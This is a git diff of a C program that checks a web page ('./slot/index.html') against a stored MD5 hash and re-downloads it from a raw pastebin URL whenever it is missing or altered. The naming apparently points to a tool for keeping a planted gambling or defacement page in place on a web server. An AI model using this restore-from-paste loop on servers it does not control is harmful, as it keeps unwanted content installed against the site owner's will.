@@ -1,15 +1,15 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <unistd.h>
+#include <sys/stat.h>
 #include <openssl/md5.h>
 #include <curl/curl.h>
 
 #define SRC             "https://pastebin.com/raw/eVjujdc1"
 #define SRC_MD5         "6807828dbfab3dfa1301a0cbfc497cab"
-
-// need to put in flying config?
-#define TARGET_DIR      "./"
-#define TARGET_FILE     "index.html"
+#define TARGET_DIR      "./slot/"
+#define TARGET_FILE     "./slot/index.html"
 
 char * calc_md5(const char *filename) {
   unsigned char c[MD5_DIGEST_LENGTH];
@@ -21,7 +21,7 @@ char * calc_md5(const char *filename) {
 
   FILE *fs = fopen (filename, "rb");
   if (fs == NULL) {
-    perror(filename); // TODO: restore
+    perror(filename); // TODO: not exist ? restore
     exit(1);
   }
   
@@ -41,7 +41,7 @@ char * calc_md5(const char *filename) {
 int restore() {
   CURL* easyhandle = curl_easy_init();
   curl_easy_setopt(easyhandle, CURLOPT_URL, SRC);
-  curl_easy_setopt(easyhandle, CURLOPT_HEADER, false);
+  curl_easy_setopt(easyhandle, CURLOPT_HEADER, 0);
 
   FILE* file = fopen(TARGET_FILE, "w");
   curl_easy_setopt(easyhandle, CURLOPT_WRITEDATA, file);
@@ -51,12 +51,30 @@ int restore() {
   fclose(file);
   return 0;
 }
+ 
+int cekidot() {
+  // TODO: fix recursive dir?
+  /*
+  if (access(TARGET_DIR, F_OK) != 0) {
+    int r = mkdir(TARGET_DIR, S_IRWXU|S_IRGRP|S_IXGRP|S_IROTH|S_IXOTH);
+    if (r == -1) {
+       printf("error creating dir");
+       exit(1);
+    }
+  }
+  */
+
+  if (access(TARGET_FILE, F_OK) != 0) {
+    restore();
+  }   
+  return 0; 
+}
 
 int main() {
   int f;
   unsigned long fs;
 
-  // TODO: check target file exist?
+  cekidot();
 
   char *new_md5 = calc_md5(TARGET_FILE);
   if (!strcmp(SRC_MD5, new_md5)) {
@@ -64,7 +82,7 @@ int main() {
   } else {
     restore();
   }
- 
   free(new_md5);
+
   return 0;
 }
